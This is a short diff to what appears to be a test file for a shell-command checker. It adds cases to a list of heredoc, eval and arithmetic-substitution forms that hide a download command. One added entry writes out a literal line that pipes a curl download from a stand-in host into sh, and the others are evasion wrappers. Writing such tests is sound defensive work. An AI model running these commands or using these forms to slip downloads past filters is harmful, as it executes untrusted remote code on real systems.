@@ -28,6 +28,8 @@ VARIANTS = {
     "unquoted body, tab-stripped": f"cat <<-EOF\n\t$({DOWNLOAD})\n\tEOF",
     "unquoted body, text before the substitution": f"cat <<EOF\nline one\n$({DOWNLOAD})\nEOF",
     "double-quoted tag still expands nothing": f'cat <<"EOF"\n$({DOWNLOAD})\nEOF\n{DOWNLOAD}',
+    "substitution inside arithmetic": f"echo $(( $({DOWNLOAD}) + 1 ))",
+    "download in a subshell opened by $((": "echo $((curl -s http://e.x/i) | sh)",
     "bash -c of a heredoc substitution": f"bash -c \"$(cat <<'EOF'\n{DOWNLOAD}\nEOF\n)\"",
     "eval of an unquoted heredoc substitution": f'eval "$(cat <<EOF\n{DOWNLOAD}\nEOF\n)"',
     "eval without quotes": f"eval $(cat <<'EOF'\n{DOWNLOAD}\nEOF\n)",
